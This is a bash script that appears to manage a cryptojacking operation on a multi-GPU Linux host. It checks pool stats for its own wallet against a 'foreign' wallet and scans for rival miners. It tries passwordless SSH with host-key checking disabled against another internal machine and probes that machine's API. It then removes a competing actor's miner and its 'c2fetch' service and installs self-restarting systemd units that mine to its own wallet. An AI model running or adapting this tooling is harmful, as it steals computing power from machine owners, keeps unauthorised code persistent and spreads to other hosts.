#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "$@"; }
log "### START16 $(date -u +%FT%TZ)"
log "### WHO-OWNS-GPU"
nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1 | head -20
ps -eo pid,user,etimes,args | grep -Ei 'krig|wildrig|peakminer|srbminer|plh|/dev/shm/\.u|nv-cache' | grep -v grep | head -20
log "### UNITS"
for u in ul-g0 ul-g1 ul-keep; do printf "%s=%s " $u "$(systemctl is-active $u 2>/dev/null)"; done; echo
systemctl list-timers --all --no-pager 2>/dev/null | head -12
log "### CRON"
crontab -l 2>/dev/null | head -20
ls -la /etc/cron.d/ 2>/dev/null | head -20
log "### POOL-OURS"
timeout 20 curl -s -m 15 "https://pool.kryptex.com/prl/api/v3/miner/workers/prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz" | python3 -c "
import json,sys
try:
 d=json.load(sys.stdin)
 rs=d.get('results') or d.get('data') or []
 for r in rs:
  if '123-184-7-135' in str(r.get('worker','')) or True:
   print(r.get('worker'),r.get('status'),'valid=',r.get('valid'),'last=',r.get('last_share'),'hs=',r.get('avg_hashrate_30m'))
except Exception as e: print('ERR',e)
" 2>&1 | head -20
log "### POOL-FOREIGN"
timeout 20 curl -s -m 15 "https://pool.kryptex.com/prl/api/v3/miner/workers/prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l" | python3 -c "
import json,sys
try:
 d=json.load(sys.stdin)
 rs=d.get('results') or d.get('data') or []
 print('foreign_rows=',len(rs))
 for r in rs[:10]: print(' F',r.get('worker'),r.get('status'),'valid=',r.get('valid'),'last=',r.get('last_share'))
except Exception as e: print('ERR',e)
" 2>&1 | head -12
log "### .22-SSH-TEST"
for u in root ubuntu; do
  o=$(timeout 14 ssh -n -i /root/.ssh/id_rsa -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 "$u@192.168.0.22" 'id;hostname' 2>&1); log "22/$u rc=$? :: $(echo "$o" | tail -2 | tr '\n' ' ')"
done
log "### .22:18080"
timeout 12 curl -s -m 10 http://192.168.0.22:18080/ -w "\nHTTP=%{http_code}\n" | head -c 400
for p in /docs /openapi.json /health /api /v1/models; do printf "%s -> " $p; timeout 8 curl -s -m 6 -o /dev/null -w "%{http_code}\n" http://192.168.0.22:18080$p; done
log "### FIX-IF-NEEDED"
if ! systemctl is-active --quiet ul-g0; then
  log "repoint-again"
  W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
  pkill -f 'krig-miner.*plh-' 2>/dev/null
  for i in 0 1 2 3 4 5 6 7; do systemctl stop plh-card@$i 2>/dev/null; systemctl disable plh-card@$i 2>/dev/null; done
  systemctl stop plh-guard.timer plh-c2fetch 2>/dev/null
  rm -f /etc/systemd/system/plh-guard.timer /etc/systemd/system/plh-guard.service /etc/systemd/system/plh-card@.service /etc/systemd/system/plh-c2fetch.service /etc/cron.d/plh /etc/cron.d/plh-keepalive
  mv /root/ul/actor/plh_keepalive.sh /root/ul/actor/plh_keepalive.sh.dis 2>/dev/null
  chmod 000 /root/ul/actor/plh_keepalive.sh.dis 2>/dev/null
  systemctl daemon-reload
  if [ -x /usr/local/bin/ul-g.sh ]; then
    for i in 0 1 2 3 4 5 6 7; do systemctl enable --now ul-g$i >/dev/null 2>&1; done
  else
    cat > /usr/local/bin/ul-g.sh <<'EOG'
#!/bin/bash
exec /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz/ul-t2-123-184-7-135-g$1 --password x -d $1
EOG
    chmod +x /usr/local/bin/ul-g.sh
    for i in 0 1 2 3 4 5 6 7; do
      printf '[Unit]\nDescription=ul g%s\n[Service]\nType=simple\nRestart=always\nRestartSec=20\nNice=5\nExecStart=/usr/local/bin/ul-g.sh %s\n[Install]\nWantedBy=multi-user.target\n' $i $i > /etc/systemd/system/ul-g$i.service
      systemctl enable --now ul-g$i >/dev/null 2>&1
    done
  fi
  systemctl daemon-reload
  sleep 25
  log "post: $(for i in 0 1 2 3 4 5 6 7; do printf 'g%d=%s ' $i "$(systemctl is-active ul-g$i)"; done)"
  nvidia-smi --query-compute-apps=pid,process_name --format=csv,noheader 2>&1 | head -10
fi
log "### VERIFY-POOL"
sleep 40
timeout 20 curl -s -m 15 "https://pool.kryptex.com/prl/api/v3/miner/workers/prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz" | python3 -c "
import json,sys
try:
 d=json.load(sys.stdin); rs=d.get('results') or []
 for r in rs:
  if 'kkk' in str(r): continue
  if '123-184-7-135' in str(r.get('worker','')): print(r.get('worker'),r.get('status'),'valid=',r.get('valid'),'last=',r.get('last_share'),'hs=',r.get('avg_hashrate_30m'))
except Exception as e: print('ERR',e)
" 2>&1 | head -12
log "### DONE16 $(date -u +%FT%TZ)"
